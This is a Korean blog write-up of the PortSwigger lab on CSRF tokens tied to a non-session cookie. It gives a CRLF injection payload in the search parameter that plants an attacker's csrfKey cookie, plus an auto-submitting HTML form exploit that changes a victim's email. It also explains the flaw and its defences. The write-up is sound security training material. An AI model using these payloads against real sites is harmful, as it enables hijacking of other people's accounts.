+++
date = '2026-06-24T09:00:00+09:00'
draft = false
title = '[Write-up] PortSwigger - CSRF where token is tied to non-session cookie'
summary = "csrfKey 쿠키에 결합된 토큰을 검색 기능의 CRLF 주입으로 덮어써, 공격자가 확보한 키와 토큰 쌍으로 피해자의 이메일을 변경하는 풀이"
toc = true
tags = ["CSRF", "CSRF Token", "Cookie Injection", "CRLF Injection", "PortSwigger", "Practitioner"]
+++

---

## 문제 분석

> **난이도**: `PRACTITIONER`  
> **Lab**: [CSRF where token is tied to non-session cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)

> ![image.png](/writeup/portswigger/csrf/05/1.png)

이메일 변경 기능에 CSRF 취약점이 존재한다. 애플리케이션이 토큰으로 CSRF를 방어하지만 세션 관리 체계와 충분히 통합되어 있지 않다. CSRF 공격으로 피해자의 이메일 주소를 변경하면 문제가 해결된다.

실습 계정은 두 개가 주어진다.

- `wiener:peter`
- `carlos:montoya`

### CSRF 진단

정상적으로 이메일을 변경하고 요청을 확인한다.

```http
POST /my-account/change-email HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: csrfKey=<csrf-key>; session=<session>
Content-Type: application/x-www-form-urlencoded

email=csrf%40csrf.com&csrf=<csrf-token>
```

세션 쿠키와 별도로 `csrfKey` 쿠키가 있다. 토큰이 세션이 아니라 이 쿠키에 결합되어 있다는 뜻이다.

다른 계정으로 로그인해 그 계정의 `csrfKey`와 `csrf` 토큰을 **쌍으로** 가져와 요청에 넣으면 이메일이 정상적으로 변경된다. 서버는 `csrfKey`와 `csrf`의 대응 관계만 확인할 뿐, 그것이 `session`의 주인과 같은 사용자인지는 확인하지 않는다.

문제는 이 쌍을 피해자의 브라우저에 심어야 한다는 점이다. CSRF만으로는 쿠키를 설정할 수 없으므로, 사용자 입력이 응답 쿠키에 반영되는 지점을 찾는다. 검색 기능이 검색어를 그대로 쿠키에 저장한다.

```http
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=csrf; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
```

검색어에 CRLF를 넣어 `Set-Cookie` 헤더를 하나 더 만들어 본다.

```text
/?search=csrf%3B%0D%0ASet-Cookie%3A+csrfKey%3D<csrf-key>%3B+SameSite%3DNone
```

응답에 헤더가 추가되고 원하는 값의 `csrfKey`가 설정된다.

```http
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=csrf;
Set-Cookie: csrfKey=<csrf-key>; SameSite=None; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
```

`SameSite=None`을 함께 지정한 이유는, 이 쿠키가 이후 교차 사이트에서 발생하는 이메일 변경 요청에도 실려야 하기 때문이다. 이 상태에서 해당 키에 대응하는 토큰으로 이메일 변경을 시도하면 정상적으로 처리된다.

---

## 익스플로잇

쿠키를 심는 요청과 폼 제출을 하나의 페이지에서 순서대로 수행한다.

```html
<form id="autosubmit" action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="POST">
    <input name="email" value="csrf2@csrf.com" />
    <input name="csrf" value="<attacker-csrf-token>" />
</form>
<img src="https://<lab-id>.web-security-academy.net/?search=csrf%3B%0D%0ASet-Cookie%3A+csrfKey%3D<attacker-csrf-key>%3B+SameSite%3DNone" onerror="document.getElementById('autosubmit').submit()"/>
```

`img`로 검색 URL을 요청해 피해자 브라우저에 공격자의 `csrfKey`를 심고, 로드 실패로 `onerror`가 호출되는 시점에 폼을 제출한다. 응답이 이미지가 아니므로 `onerror`는 반드시 발생하며, 이를 쿠키 설정 완료 시점을 잡는 신호로 사용한다.

폼이 제출될 때 브라우저는 피해자의 `session` 쿠키와 방금 덮어쓴 `csrfKey`를 함께 보내고, 본문에는 그 키에 대응하는 토큰이 실린다. 세 값 중 두 개가 공격자의 것이지만 서버는 이를 구분하지 못한다.

이 페이로드를 피해자에게 전달하면 문제가 해결된다.

![image.png](/writeup/portswigger/csrf/05/2.png)

---

## 정리

이 랩은 토큰을 결합하려는 시도 자체는 있었지만 결합 대상을 잘못 고른 경우다. 토큰이 `csrfKey`라는 별도 쿠키에 묶여 있는데, 그 쿠키는 인증과 아무 관계가 없다. 결과적으로 서버가 검증하는 것은 "이 두 값이 서로 대응하는가"일 뿐 "이 요청을 보낸 사람이 세션의 주인인가"가 아니다.

이런 구조는 CSRF 방어를 세션 관리와 분리된 별도 컴포넌트로 붙였을 때 흔히 나타난다. 프레임워크나 미들웨어가 자체 쿠키로 토큰 상태를 관리하면 구현은 단순해지지만, 세션과의 연결이 끊기면서 공격자가 자신의 상태를 통째로 피해자에게 이식할 수 있는 길이 열린다.

이 공격이 성립하려면 쿠키를 심을 수단이 필요하다. 여기서는 검색 기능의 CRLF 주입이 그 역할을 했다. 단독으로는 심각도가 낮아 보이는 헤더 주입이 CSRF 방어를 무력화하는 발판이 된 것으로, 취약점을 개별 심각도가 아니라 조합 가능성으로 평가해야 하는 이유를 보여준다. 진단에서도 쿠키에 사용자 입력이 반영되는 지점은 CSRF 관련 기능과 함께 묶어 확인할 필요가 있다.

방어는 토큰을 세션에 저장하고 세션 값과 직접 대조하는 것이다. 부가적으로 헤더에 들어가는 값에서 CR·LF를 제거해 응답 분할과 쿠키 주입 자체를 막아야 한다.
